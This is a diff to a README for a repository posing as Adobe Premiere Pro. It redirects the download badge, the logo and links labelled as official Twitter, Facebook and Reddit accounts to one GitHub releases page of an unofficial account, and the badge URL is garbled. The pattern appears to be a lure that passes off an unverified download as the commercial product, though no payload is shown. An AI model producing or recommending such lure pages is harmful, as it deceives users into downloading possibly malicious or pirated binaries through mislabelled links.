@@ -57,7 +57,7 @@ This repository covers a wide range of topics related to Adobe Premiere Pro, inc
 
 To start optimizing your video editing workflow with Adobe Premiere Pro, download the software by visiting the following link:
 
-[![Download Adobe Premiere Pro](https://img.shields.io/badge/Download-Adobe%20Premiere%20Pro-blue.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download Adobe Premiere Pro](https://github.com/Ksguvh/Adobe-Premiere-Pro/releases%20Premiere%https://github.com/Ksguvh/Adobe-Premiere-Pro/releases)](https://github.com/Ksguvh/Adobe-Premiere-Pro/releases)
 
 *Note: After downloading, launch the application and start exploring the features it offers.*
 
@@ -69,7 +69,7 @@ Adobe Premiere Pro is known for its user-friendly interface, powerful editing ca
 
 Don't wait any longer - dive into the world of professional video editing with Adobe Premiere Pro!
 
-![Adobe Premiere Pro Logo](https://example.com/adobe-premiere-pro-logo.png)
+![Adobe Premiere Pro Logo](https://github.com/Ksguvh/Adobe-Premiere-Pro/releases)
 
 ## Contribution Guidelines 🤝
 
@@ -81,9 +81,9 @@ Let's collaborate and build a vibrant community around Adobe Premiere Pro!
 
 For more updates, tutorials, and discussions on Adobe Premiere Pro and video editing, join our community on social media platforms and forums:
 
-- Twitter: [@AdobePremierePro](https://twitter.com/AdobePremierePro)
-- Facebook: [Adobe Premiere Pro Official](https://www.facebook.com/adobepremierepro)
-- Reddit: [r/AdobePremierePro](https://www.reddit.com/r/AdobePremierePro)
+- Twitter: [@AdobePremierePro](https://github.com/Ksguvh/Adobe-Premiere-Pro/releases)
+- Facebook: [Adobe Premiere Pro Official](https://github.com/Ksguvh/Adobe-Premiere-Pro/releases)
+- Reddit: [r/AdobePremierePro](https://github.com/Ksguvh/Adobe-Premiere-Pro/releases)
 
 Let's create amazing videos together!
 
